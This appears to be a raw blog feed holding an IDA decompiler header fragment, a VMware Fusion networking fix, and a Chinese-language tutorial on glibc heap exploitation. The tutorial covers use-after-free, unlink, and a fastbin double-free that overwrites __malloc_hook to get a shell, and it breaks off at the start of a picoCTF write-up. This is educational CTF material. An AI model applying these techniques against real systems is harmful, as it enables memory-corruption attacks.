style="color: #0000ff;">sizeof</span>(T) * <span style="color: #800080;">8</span><span style="color: #000000;">;</span><span style="color: #008080;">185</span>   count %=<span style="color: #000000;"> nbits;</span><span style="color: #008080;">186</span> <span style="color: #008080;">187</span>   <span style="color: #0000ff;">return</span> (value &gt;&gt; (nbits-count)) &amp; <span style="color: #800080;">1</span><span style="color: #000000;">;</span><span style="color: #008080;">188</span> <span style="color: #000000;">}</span><span style="color: #008080;">189</span> <span style="color: #008080;">190</span> <span style="color: #008000;">//</span><span style="color: #008000;"> carry flag of right shift</span><span style="color: #008080;">191</span> template&lt;<span style="color: #0000ff;">class</span> T&gt; int8 __MKCSHR__(T value, <span style="color: #0000ff;">uint</span><span style="color: #000000;"> count)</span><span style="color: #008080;">192</span> <span style="color: #000000;">{</span><span style="color: #008080;">193</span>   <span style="color: #0000ff;">return</span> (value &gt;&gt; (count-<span style="color: #800080;">1</span>)) &amp; <span style="color: #800080;">1</span><span style="color: #000000;">;</span><span style="color: #008080;">194</span> <span style="color: #000000;">}</span><span style="color: #008080;">195</span> <span style="color: #008080;">196</span> <span style="color: #008000;">//</span><span style="color: #008000;"> sign flag</span><span style="color: #008080;">197</span> template&lt;<span style="color: #0000ff;">class</span> T&gt;<span style="color: #000000;"> int8 __SETS__(T x)</span><span style="color: #008080;">198</span> <span style="color: #000000;">{</span><span style="color: #008080;">199</span>   <span style="color: #0000ff;">if</span> ( <span style="color: #0000ff;">sizeof</span>(T) == <span style="color: #800080;">1</span><span style="color: #000000;"> )</span><span style="color: #008080;">200</span>     <span style="color: #0000ff;">return</span> int8(x) &lt; <span style="color: #800080;">0</span><span style="color: #000000;">;</span><span style="color: #008080;">201</span>   <span style="color: #0000ff;">if</span> ( <span style="color: #0000ff;">sizeof</span>(T) == <span style="color: #800080;">2</span><span style="color: #000000;"> )</span><span style="color: #008080;">202</span>     <span style="color: #0000ff;">return</span> int16(x) &lt; <span style="color: #800080;">0</span><span style="color: #000000;">;</span><span style="color: #008080;">203</span>   <span style="color: #0000ff;">if</span> ( <span style="color: #0000ff;">sizeof</span>(T) == <span style="color: #800080;">4</span><span style="color: #000000;"> )</span><span style="color: #008080;">204</span>     <span style="color: #0000ff;">return</span> int32(x) &lt; <span style="color: #800080;">0</span><span style="color: #000000;">;</span><span style="color: #008080;">205</span>   <span style="color: #0000ff;">return</span> int64(x) &lt; <span style="color: #800080;">0</span><span style="color: #000000;">;</span><span style="color: #008080;">206</span> <span style="color: #000000;">}</span><span style="color: #008080;">207</span> <span style="color: #008080;">208</span> <span style="color: #008000;">//</span><span style="color: #008000;"> overflow flag of subtraction (x-y)</span><span style="color: #008080;">209</span> template&lt;<span style="color: #0000ff;">class</span> T, <span style="color: #0000ff;">class</span> U&gt;<span style="color: #000000;"> int8 __OFSUB__(T x, U y)</span><span style="color: #008080;">210</span> <span style="color: #000000;">{</span><span style="color: #008080;">211</span>   <span style="color: #0000ff;">if</span> ( <span style="color: #0000ff;">sizeof</span>(T) &lt; <span style="color: #0000ff;">sizeof</span><span style="color: #000000;">(U) )</span><span style="color: #008080;">212</span> <span style="color: #000000;">  {</span><span style="color: #008080;">213</span>     U x2 =<span style="color: #000000;"> x;</span><span style="color: #008080;">214</span>     int8 sx =<span style="color: #000000;"> __SETS__(x2);</span><span style="color: #008080;">215</span>     <span style="color: #0000ff;">return</span> (sx ^ __SETS__(y)) &amp; (sx ^ __SETS__(x2-<span style="color: #000000;">y));</span><span style="color: #008080;">216</span> <span style="color: #000000;">  }</span><span style="color: #008080;">217</span>   <span style="color: #0000ff;">else</span><span style="color: #008080;">218</span> <span style="color: #000000;">  {</span><span style="color: #008080;">219</span>     T y2 =<span style="color: #000000;"> y;</span><span style="color: #008080;">220</span>     int8 sx =<span style="color: #000000;"> __SETS__(x);</span><span style="color: #008080;">221</span>     <span style="color: #0000ff;">return</span> (sx ^ __SETS__(y2)) &amp; (sx ^ __SETS__(x-<span style="color: #000000;">y2));</span><span style="color: #008080;">222</span> <span style="color: #000000;">  }</span><span style="color: #008080;">223</span> <span style="color: #000000;">}</span><span style="color: #008080;">224</span> <span style="color: #008080;">225</span> <span style="color: #008000;">//</span><span style="color: #008000;"> overflow flag of addition (x+y)</span><span style="color: #008080;">226</span> template&lt;<span style="color: #0000ff;">class</span> T, <span style="color: #0000ff;">class</span> U&gt;<span style="color: #000000;"> int8 __OFADD__(T x, U y)</span><span style="color: #008080;">227</span> <span style="color: #000000;">{</span><span style="color: #008080;">228</span>   <span style="color: #0000ff;">if</span> ( <span style="color: #0000ff;">sizeof</span>(T) &lt; <span style="color: #0000ff;">sizeof</span><span style="color: #000000;">(U) )</span><span style="color: #008080;">229</span> <span style="color: #000000;">  {</span><span style="color: #008080;">230</span>     U x2 =<span style="color: #000000;"> x;</span><span style="color: #008080;">231</span>     int8 sx =<span style="color: #000000;"> __SETS__(x2);</span><span style="color: #008080;">232</span>     <span style="color: #0000ff;">return</span> ((<span style="color: #800080;">1</span> ^ sx) ^ __SETS__(y)) &amp; (sx ^ __SETS__(x2+<span style="color: #000000;">y));</span><span style="color: #008080;">233</span> <span style="color: #000000;">  }</span><span style="color: #008080;">234</span>   <span style="color: #0000ff;">else</span><span style="color: #008080;">235</span> <span style="color: #000000;">  {</span><span style="color: #008080;">236</span>     T y2 =<span style="color: #000000;"> y;</span><span style="color: #008080;">237</span>     int8 sx =<span style="color: #000000;"> __SETS__(x);</span><span style="color: #008080;">238</span>     <span style="color: #0000ff;">return</span> ((<span style="color: #800080;">1</span> ^ sx) ^ __SETS__(y2)) &amp; (sx ^ __SETS__(x+<span style="color: #000000;">y2));</span><span style="color: #008080;">239</span> <span style="color: #000000;">  }</span><span style="color: #008080;">240</span> <span style="color: #000000;">}</span><span style="color: #008080;">241</span> <span style="color: #008080;">242</span> <span style="color: #008000;">//</span><span style="color: #008000;"> carry flag of subtraction (x-y)</span><span style="color: #008080;">243</span> template&lt;<span style="color: #0000ff;">class</span> T, <span style="color: #0000ff;">class</span> U&gt;<span style="color: #000000;"> int8 __CFSUB__(T x, U y)</span><span style="color: #008080;">244</span> <span style="color: #000000;">{</span><span style="color: #008080;">245</span>   <span style="color: #0000ff;">int</span> size = <span style="color: #0000ff;">sizeof</span>(T) &gt; <span style="color: #0000ff;">sizeof</span>(U) ? <span style="color: #0000ff;">sizeof</span>(T) : <span style="color: #0000ff;">sizeof</span><span style="color: #000000;">(U);</span><span style="color: #008080;">246</span>   <span style="color: #0000ff;">if</span> ( size == <span style="color: #800080;">1</span><span style="color: #000000;"> )</span><span style="color: #008080;">247</span>     <span style="color: #0000ff;">return</span> uint8(x) &lt;<span style="color: #000000;"> uint8(y);</span><span style="color: #008080;">248</span>   <span style="color: #0000ff;">if</span> ( size == <span style="color: #800080;">2</span><span style="color: #000000;"> )</span><span style="color: #008080;">249</span>     <span style="color: #0000ff;">return</span> uint16(x) &lt;<span style="color: #000000;"> uint16(y);</span><span style="color: #008080;">250</span>   <span style="color: #0000ff;">if</span> ( size == <span style="color: #800080;">4</span><span style="color: #000000;"> )</span><span style="color: #008080;">251</span>     <span style="color: #0000ff;">return</span> uint32(x) &lt;<span style="color: #000000;"> uint32(y);</span><span style="color: #008080;">252</span>   <span style="color: #0000ff;">return</span> uint64(x) &lt;<span style="color: #000000;"> uint64(y);</span><span style="color: #008080;">253</span> <span style="color: #000000;">}</span><span style="color: #008080;">254</span> <span style="color: #008080;">255</span> <span style="color: #008000;">//</span><span style="color: #008000;"> carry flag of addition (x+y)</span><span style="color: #008080;">256</span> template&lt;<span style="color: #0000ff;">class</span> T, <span style="color: #0000ff;">class</span> U&gt;<span style="color: #000000;"> int8 __CFADD__(T x, U y)</span><span style="color: #008080;">257</span> <span style="color: #000000;">{</span><span style="color: #008080;">258</span>   <span style="color: #0000ff;">int</span> size = <span style="color: #0000ff;">sizeof</span>(T) &gt; <span style="color: #0000ff;">sizeof</span>(U) ? <span style="color: #0000ff;">sizeof</span>(T) : <span style="color: #0000ff;">sizeof</span><span style="color: #000000;">(U);</span><span style="color: #008080;">259</span>   <span style="color: #0000ff;">if</span> ( size == <span style="color: #800080;">1</span><span style="color: #000000;"> )</span><span style="color: #008080;">260</span>     <span style="color: #0000ff;">return</span> uint8(x) &gt; uint8(x+<span style="color: #000000;">y);</span><span style="color: #008080;">261</span>   <span style="color: #0000ff;">if</span> ( size == <span style="color: #800080;">2</span><span style="color: #000000;"> )</span><span style="color: #008080;">262</span>     <span style="color: #0000ff;">return</span> uint16(x) &gt; uint16(x+<span style="color: #000000;">y);</span><span style="color: #008080;">263</span>   <span style="color: #0000ff;">if</span> ( size == <span style="color: #800080;">4</span><span style="color: #000000;"> )</span><span style="color: #008080;">264</span>     <span style="color: #0000ff;">return</span> uint32(x) &gt; uint32(x+<span style="color: #000000;">y);</span><span style="color: #008080;">265</span>   <span style="color: #0000ff;">return</span> uint64(x) &gt; uint64(x+<span style="color: #000000;">y);</span><span style="color: #008080;">266</span> <span style="color: #000000;">}</span><span style="color: #008080;">267</span> <span style="color: #008080;">268</span> <span style="color: #0000ff;">#else</span><span style="color: #008080;">269</span> <span style="color: #008000;">//</span><span style="color: #008000;"> The following definition is not quite correct because it always returns</span><span style="color: #008080;">270</span> <span style="color: #008000;">//</span><span style="color: #008000;"> uint64. The above C++ functions are good, though.</span><span style="color: #008080;">271</span> <span style="color: #0000ff;">#define</span> __PAIR__(high, low) (((uint64)(high)&lt;&lt;sizeof(high)*8) | low)<span style="color: #008080;">272</span> <span style="color: #008000;">//</span><span style="color: #008000;"> For C, we just provide macros, they are not quite correct.</span><span style="color: #008080;">273</span> <span style="color: #0000ff;">#define</span> __ROL__(x, y) __rotl__(x, y)      <span style="color: #008000;">//</span><span style="color: #008000;"> Rotate left</span><span style="color: #008080;">274</span> <span style="color: #0000ff;">#define</span> __ROR__(x, y) __rotr__(x, y)      <span style="color: #008000;">//</span><span style="color: #008000;"> Rotate right</span><span style="color: #008080;">275</span> <span style="color: #0000ff;">#define</span> __CFSHL__(x, y) invalid_operation <span style="color: #008000;">//</span><span style="color: #008000;"> Generate carry flag for (x&lt;&lt;y)</span><span style="color: #008080;">276</span> <span style="color: #0000ff;">#define</span> __CFSHR__(x, y) invalid_operation <span style="color: #008000;">//</span><span style="color: #008000;"> Generate carry flag for (x&gt;&gt;y)</span><span style="color: #008080;">277</span> <span style="color: #0000ff;">#define</span> __CFADD__(x, y) invalid_operation <span style="color: #008000;">//</span><span style="color: #008000;"> Generate carry flag for (x+y)</span><span style="color: #008080;">278</span> <span style="color: #0000ff;">#define</span> __CFSUB__(x, y) invalid_operation <span style="color: #008000;">//</span><span style="color: #008000;"> Generate carry flag for (x-y)</span><span style="color: #008080;">279</span> <span style="color: #0000ff;">#define</span> __OFADD__(x, y) invalid_operation <span style="color: #008000;">//</span><span style="color: #008000;"> Generate overflow flag for (x+y)</span><span style="color: #008080;">280</span> <span style="color: #0000ff;">#define</span> __OFSUB__(x, y) invalid_operation <span style="color: #008000;">//</span><span style="color: #008000;"> Generate overflow flag for (x-y)</span><span style="color: #008080;">281</span> <span style="color: #0000ff;">#endif</span><span style="color: #008080;">282</span> <span style="color: #008080;">283</span> <span style="color: #008000;">//</span><span style="color: #008000;"> No definition for rcl/rcr because the carry flag is unknown</span><span style="color: #008080;">284</span> <span style="color: #0000ff;">#define</span> __RCL__(x, y)    invalid_operation <span style="color: #008000;">//</span><span style="color: #008000;"> Rotate left thru carry</span><span style="color: #008080;">285</span> <span style="color: #0000ff;">#define</span> __RCR__(x, y)    invalid_operation <span style="color: #008000;">//</span><span style="color: #008000;"> Rotate right thru carry</span><span style="color: #008080;">286</span> <span style="color: #0000ff;">#define</span> __MKCRCL__(x, y) invalid_operation <span style="color: #008000;">//</span><span style="color: #008000;"> Generate carry flag for a RCL</span><span style="color: #008080;">287</span> <span style="color: #0000ff;">#define</span> __MKCRCR__(x, y) invalid_operation <span style="color: #008000;">//</span><span style="color: #008000;"> Generate carry flag for a RCR</span><span style="color: #008080;">288</span> <span style="color: #0000ff;">#define</span> __SETP__(x, y)   invalid_operation <span style="color: #008000;">//</span><span style="color: #008000;"> Generate parity flag for (x-y)</span><span style="color: #008080;">289</span> <span style="color: #008080;">290</span> <span style="color: #008000;">//</span><span style="color: #008000;"> In the decompilation listing there are some objects declarared as _UNKNOWN</span><span style="color: #008080;">291</span> <span style="color: #008000;">//</span><span style="color: #008000;"> because we could not determine their types. Since the C compiler does not</span><span style="color: #008080;">292</span> <span style="color: #008000;">//</span><span style="color: #008000;"> accept void item declarations, we replace them by anything of our choice,</span><span style="color: #008080;">293</span> <span style="color: #008000;">//</span><span style="color: #008000;"> for example a char:</span><span style="color: #008080;">294</span> <span style="color: #008080;">295</span> <span style="color: #0000ff;">#define</span> _UNKNOWN char<span style="color: #008080;">296</span> <span style="color: #008080;">297</span> <span style="color: #000000;">#ifdef _MSC_VER</span><span style="color: #008080;">298</span> <span style="color: #0000ff;">#define</span> snprintf _snprintf<span style="color: #008080;">299</span> <span style="color: #0000ff;">#define</span> vsnprintf _vsnprintf<span style="color: #008080;">300</span> <span style="color: #0000ff;">#endif</span></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMware Fusion NAT无法连接网络</title>
      <link href="/2019/04/03/VMware-Fusion-NAT%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5%E7%BD%91%E7%BB%9C/"/>
      <url>/2019/04/03/VMware-Fusion-NAT%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5%E7%BD%91%E7%BB%9C/</url>
      
        <content type="html"><![CDATA[<h2><span id="写在前面">写在前面</span></h2><blockquote><p>真的是个奇奇怪怪的问题，打开机器突然ping不通虚拟机了，中间还逼得我复习了一下计网。</p></blockquote><h2><span id="vmnet8">vmnet8</span></h2><p>vmnet8是host和虚拟机的NAT网络的网卡，默认情况下mac到NAT网段的连接应该是直连的！直连的！我还傻乎乎的去改路由表。一般情况下只要虚拟机ip和vmnet8在同一个网段内，默认网关是<code>192.168.xxx.2</code>,vmnet8的地址是<code>192.168.xxx.2</code>. mac下查看路由表信息是通过<code>route get xxx</code>. 查看路由表内容是通过<code>netstat -rn</code>.(在向豆豆请教的过程中发现有个repo叫做iproute2mac)</p><h2><span id="重启vmware-network-service">重启vmware network service</span></h2><p>找了很多解决方案，最后突然发现连vmnet8都连不上！！！绝壁网卡down了，果断重启(感谢yjw同学的帮助)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo /Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli --stop</span><br><span class="line">sudo /Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli --start</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
        <tags>
            
            <tag> mac </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆利用</title>
      <link href="/2019/04/02/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
      <url>/2019/04/02/%E5%A0%86%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2><span id="写在前面">写在前面</span></h2><blockquote><p>这篇文章记录一下glibc堆利用的常见方法，和一些相关的想法和trick的记录</p></blockquote><a id="more"></a><h2><span id="溢出的危险函数">溢出的危险函数</span></h2><ol><li>输入</li></ol><ul><li>gets，直接读取一行，忽略 ‘\x00’</li><li>scanf</li><li>vscanf</li></ul><ol start="2"><li>输出</li></ol><ul><li>sprintf</li></ul><ol start="3"><li>字符串</li></ol><ul><li>strcpy，字符串复制，遇到 ‘\x00’ 停止</li><li>strcat，字符串拼接，遇到 ‘\x00’ 停止</li><li>bcopy</li></ul><h2><span id="malloc">malloc</span></h2><h3><span id="过程">过程</span></h3><p>长度位于 fastbin 时:</p><pre><code>1. 根据大小获得fastbin的index2. 根据index获取fastbin中链表的头指针    如果头指针为 NULL，转去smallbin3. 将头指针的下一个chunk地址作为链表头指针4. 分配的chunk保持inuse状态，避免被合并5. 返回除去chunk_header的地址</code></pre><p>长度位于 smallbin 时:</p><pre><code>1. 根据大小获得smallbin的index2. 根据index获取smallbin中双向循环链表的头指针3. 将链表最后一个chunk赋值给victim4. if(victim == 表头)    链表为空，不从smallbin中分配  else if(victim == 0)    链表未初始化，将fastbin中的chunk合并  else    取出victim,设置inuse5. 检查victim是否为main_arena,设置标志位6. 返回除去chunk_header的地址</code></pre><p>长度位于 largebin 时:</p><pre><code>1. 根据大小获得largebin的index2. 将fastbin中chunk合并，加入到unsortbin中</code></pre><p>面的分配过程并没有完成，当 smallbin 中没有 chunk 或者 smallbin 未初始化时，并没有返回分配结果，这种情况下的chunk分配将在后面与largebin的分配一起处理</p><p>unsortedbin:</p><pre><code>1. 反向遍历unsortedbin,检查 2*size_t&lt;chunk_size&lt;内存总分配量2. unsortedbin的特殊分配:        如果前一步smallbin分配未完成        并且 unsortedbin中只有一个chunk        并且该chunk为 last remainder chunk        并且该chunk大小 &gt;（所需大小+最小分配大小）   则切分一块分配3. 如果请求大小正好等于当前遍历chunk的大小，则直接分配4. 继续遍历，将合适大小的chunk加入到smallbin中，向前插入作为链表的第一个chunk。(smallbin中每个链表中chunk大小相同)5. 将合适大小的chunk加入到largebin中，插入到合适的位置（largebin中每个链表chunk由大到小排列）</code></pre><p>largebin:</p><pre><code>1. 反向遍历largebin，由下到上查找，找到合适大小后切分    切分后大小&lt;最小分配大小，返回整个chunk，会略大于申请大小    切分后大小&gt;最小分配大小，加入 unsortedbin。2. 未找到，index+1，继续寻找</code></pre><h3><span id="check">check</span></h3><ol><li>从fastbin中取出chunk后，检查size是否属于fastbin</li><li>从smallbin中除去chunk后，检查victim-&gt;bk-&gt;fd == victim</li><li>从unsortbin取chunk时，要检查2*size_t&lt;chunk_size&lt;内存总分配量</li><li>从largebin取chunk时，切分后的chunk要加入unsortedbin,需要检查 unsortedbin的第一个chunk的bk是否指向unsortedbin</li></ol><h2><span id="realloc">realloc</span></h2><p><strong>当realloc(ptr,size)的size不等于ptr的size时</strong></p><ol><li>如果申请size&gt;原来size</li></ol><ul><li>如果chunk与top chunk相邻，直接扩展这个chunk到新size大小</li><li>如果chunk与top chunk不相邻，相当于free(ptr),malloc(new_size)</li></ul><ol start="2"><li>如果申请size&lt;原来size</li></ol><ul><li>如果相差不足以容得下一个最小chunk(64位下32个字节，32位下16个字节)，则保持不变</li><li>如果相差可以容得下一个最小chunk，则切割原chunk为两部分，free掉后一部分</li></ul><ol start="3"><li>当realloc(ptr,size)的size等于0时，相当于free(ptr)</li><li>当realloc(ptr,size)的size等于ptr的size，不进行任何操作</li></ol><h2><span id="free">free</span></h2><ul><li>调用free函数后，根据chunck size的大小不同把free的chunk放到不同的bin中，会修改的是fd和bk的指针值，其他的用户数据并不会做改动。而基于fastbin的管理机制，下次申请时，这个堆块的内容就可以被重复利用</li><li>有时结构体中带有函数指针，如果在调用这个函数前没有做好相应的判断而且free掉指针后没有置NULL，就会形成use after free漏洞：主要是利用溢出或者fastbin的机制修改函数指针的位置，然后UAF来getshell</li><li>free的检查主要是根据本chunk的size检测下一块的inuse位，查看是否有double free的情况发生检查当前free的chunk是否与fastbin中的第一个chunk相同，相同则报错根据当前的inuse以及后一块的后一块的inuse判断是否需要合并，如果需要合并则对在链表中的freebin进行unlink操作</li></ul><h2><span id="fastbin">fastbin</span></h2><p>源码里有fastbin最大size的定义，64位机是160bytes.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1570</span><span class="comment">/* The maximum fastbin request size we support */</span></span><br><span class="line"><span class="number">1571</span><span class="meta">#<span class="meta-keyword">define</span> MAX_FAST_SIZE     (80 * SIZE_SZ / 4)</span></span><br><span class="line">...</span><br><span class="line">mfastbinptr fastbinsY[NFASTBINS];</span><br></pre></td></tr></table></figure></p><h3><span id="shape">shape</span></h3><p>一般来说，NFASTBINS算出来是10，64位的fastbin和32位的不同，前者从0x20开始依次加0x10，后者从0x10开始，依次加0x08. 64位的fastbin情况如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//这里的size指整个chunk大小</span><br><span class="line">Fastbins[idx=0, size=0x20]</span><br><span class="line">Fastbins[idx=1, size=0x30]</span><br><span class="line">Fastbins[idx=2, size=0x40]</span><br><span class="line">Fastbins[idx=3, size=0x50]</span><br><span class="line">Fastbins[idx=4, size=0x60]</span><br><span class="line">Fastbins[idx=5, size=0x70]</span><br><span class="line">Fastbins[idx=6, size=0x80]</span><br><span class="line">Fastbins[idx=7, size=0x90]</span><br><span class="line">Fastbins[idx=8, size=0xa0]</span><br><span class="line">Fastbins[idx=9, size=0xb0]</span><br></pre></td></tr></table></figure></p><p>如果我们进行测试，就会发现我们最大malloc(120)，size=128的chunk才是fast chunk，free后可以放到fastbinsY[6]中去，但是如果我们malloc(128)，free后却放到了unsortbin中去，也就是说index= or 8也是用不上的，这里我们看代码:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">729</span><span class="meta">#<span class="meta-keyword">ifndef</span> DEFAULT_MXFAST</span></span><br><span class="line"><span class="number">730</span><span class="meta">#<span class="meta-keyword">define</span> DEFAULT_MXFAST     (64 * SIZE_SZ / 4)</span></span><br><span class="line"><span class="number">731</span><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></p><p>32位同理，也只用到64字节，72和80的也是没有用的</p><h3><span id="fasbin_index">fasbin_index</span></h3><p>根据size计算fastbin的index,这里的size指的是整个chunk的size，也就是chunk header中标记的size<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#<span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz)                                                      \</span></span><br><span class="line">    ((((<span class="keyword">unsigned</span> <span class="keyword">int</span>) (sz)) &gt;&gt; (SIZE_SZ == <span class="number">8</span> ? <span class="number">4</span> : <span class="number">3</span>)) - <span class="number">2</span>)</span><br></pre></td></tr></table></figure></p><h3><span id="size-check">size check</span></h3><p>值得注意的是，我们在 main 函数的第一步就进行了bss_chunk.size=0x21;的操作这是因为_int_malloc 会对欲分配位置的 size 域进行验证，如果其 size 与当前fastbin 链表应有 size 不符就会抛出异常。</p><h2><span id="bins">Bins</span></h2><h3><span id="概述">概述</span></h3><p>bin在内存中用来管理free chunk，bin为带有头结点（链表头部不是chunk）的链表数组。Bins在malloc_state中的定义是这样的：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NBINS 128</span></span><br><span class="line"><span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">mchunkptr bins[ NBINS * <span class="number">2</span> - <span class="number">2</span> ];</span><br></pre></td></tr></table></figure></p><p>其中idx=1是unsorted bin,idx=2~63是small bin,idx=64~126是largebin<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin:</span><br><span class="line">    双向循环链表</span><br><span class="line">    不排序</span><br><span class="line">    暂时存储<span class="built_in">free</span>后的chunk，一段时间后会将chunk放入对应的bin中</span><br><span class="line">    只有一个链表</span><br><span class="line">smallbin:</span><br><span class="line">    双向循环链表</span><br><span class="line">    <span class="keyword">sizeof</span>(chunk) &lt;= <span class="number">504</span> | <span class="number">1008</span>(bytes)</span><br><span class="line">    先进先出（类似队列）</span><br><span class="line">    <span class="number">16</span>,<span class="number">24.</span>.<span class="number">.64</span>,<span class="number">72.</span>.<span class="number">.508</span> bytes(<span class="number">62</span>个链表)</span><br><span class="line"><span class="number">32</span>,<span class="number">48.</span>.<span class="number">.1008</span></span><br><span class="line">largebin:</span><br><span class="line">    双向循环链表</span><br><span class="line">    <span class="keyword">sizeof</span>(chunk) &gt;= <span class="number">512</span> | <span class="number">1024</span>(bytes)</span><br><span class="line">    <span class="built_in">free</span> chunk中多两个指针分别指向前后的large chunk</span><br><span class="line">    <span class="number">63</span>个链表:<span class="number">0</span><span class="number">-31</span>(<span class="number">512</span>+<span class="number">64</span>*i)</span><br><span class="line">            <span class="number">32</span><span class="number">-48</span>(<span class="number">2496</span>+<span class="number">512</span>*i)</span><br><span class="line">            ...</span><br><span class="line">    链表中chunk大小不固定，先大后小</span><br></pre></td></tr></table></figure></p><p><img src="/assets/img/heap/bins.png" alt="bins"></p><h3><span id="空间复用">空间复用</span></h3><p>从上图可以非常清晰的看出空间复用！具体细节下面图也展示清楚了<br><img src="/assets/img/heap/binsreuse.png" alt="bins"></p><h3><span id="unsorted-bin">unsorted bin</span></h3><p>unsorted bin 中的空闲 chunk 处于乱序状态，主要有两个来源</p><ul><li>当一个(多大？)较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li><li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。关于 top chunk 的解释，请参考下面的介绍。</li><li>当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话<br>此外，Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO</li></ul><h3><span id="smallbin">smallbin</span></h3><p><img src="/assets/img/heap/smallbinsize.png" alt="smallbin"></p><h3><span id="unlink">unlink</span></h3><p>unlink的原理在于unlink宏在处理时会互写数据造成任意地址写。经过改进后的unlink宏增加了check，但是可以通过一个指向堆上的指针导致绕过情况。待补充</p><h3><span id="ptmalloc中相关宏的判断">ptmalloc中相关宏的判断</span></h3><ul><li>chunk overlapping的原理在于ptmalloc的堆块验证机制的不完善，通过一些ptmalloc定义的宏就可以看出这一点。</li><li>inuse()：仅通过下一块的inuse位来判定当前块是否使用.</li><li>prev_chunk()：如果前一个块为空，那么进行空块合并时，仅使用本块的prev_size来寻找前块的头。</li><li>next_chunk()：仅通过本块头+本块大小的方式来寻找下一块的头</li><li>chunksize()：仅通过本块的size确定本块的大小。</li></ul><h3><span id="malloc_hook">malloc_hook</span></h3><p>在利用fastbin的double_free的时候，如果可以把malloc_hook的地址改成one_gadget的内容，再次malloc就能直接getshell.但是想要double free必须过size check，这里有一个办法是用同样一个libc，gdb进去之后把<code>p (void *)&amp;main_arena</code>往上找错位的可以符合fastbin大小的size，一般都是可以直接找到一个0x7f.在libc-2.23版本下，应该是malloc_hook网上偏移35个字节的地方可以作为一个新的chunk被申请，也就是malloc_hook往上偏移27个字节的地方是0x7f.根据fastbin_index的宏来看应该被分配到0x70的bin中，所以利用0x70的fastbin来构造double free即可，这个地址可以用<code>libc.symbols[&#39;__malloc_hook&#39;] - 35</code>得到.同理也可以处理__free_hook,找法一样。</p><h2><span id="调试">调试</span></h2><p>踩过的一些坑记录一下：</p><ul><li>pwntools写到一半attach进去的时候最后一行不要用recv(),而是用recvall().不然会在莫名其妙的地方进程被terminate.但是有的时候程序recvall()也没有真的recv所有的内容，然后就会先跳到一些奇怪的地方。所以最好的办法还是recvuntil,如果可以的话。</li></ul><h2><span id="实例">实例</span></h2><h3><span id="picoctfsword">picoctf——sword</span></h3><p>没有开PIE，所以不用泄露加载地址。题目给了源码，其实不给也ok. 同时提供了libc，但是在调用equip函数时没有判断is_used，是一个非常明显的uaf漏洞。而且申请堆块的大小符合fastbin的特点，利用前一次申请到的char *name中写入got_libc_start_main然后重新malloc来泄露libc基址，然后再用同样的方法写入system和shellstr。具体的题目和wp如下：<br><strong>sword.c</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 